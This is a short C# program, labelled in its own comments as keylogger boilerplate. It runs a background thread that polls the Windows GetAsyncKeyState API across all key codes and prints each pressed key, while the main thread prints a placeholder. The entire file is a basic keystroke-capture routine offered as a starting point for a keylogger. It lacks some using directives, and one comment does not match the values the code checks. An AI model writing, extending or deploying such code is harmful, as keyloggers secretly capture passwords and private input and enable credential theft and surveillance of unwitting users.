using System.Runtime.InteropServices;

static class Program
{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    static void ListenKeys()//boilerplate for keylogger in C#
    {
        while (true)
        {
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                // replace -32767 with 32769 for windows 10.
                if (keyState == 1 || keyState == 32769)
                {
                    Console.WriteLine((char)i);
                    break;
                }
            }
        }
    }
    static void Main(string[] args)
    {
        new Thread(new ThreadStart(ListenKeys)).Start();//our keylogger works as a thread
        while (true)//our main thread
        {
            Console.WriteLine("foobar");
            Console.ReadKey(true);
        }
    }
}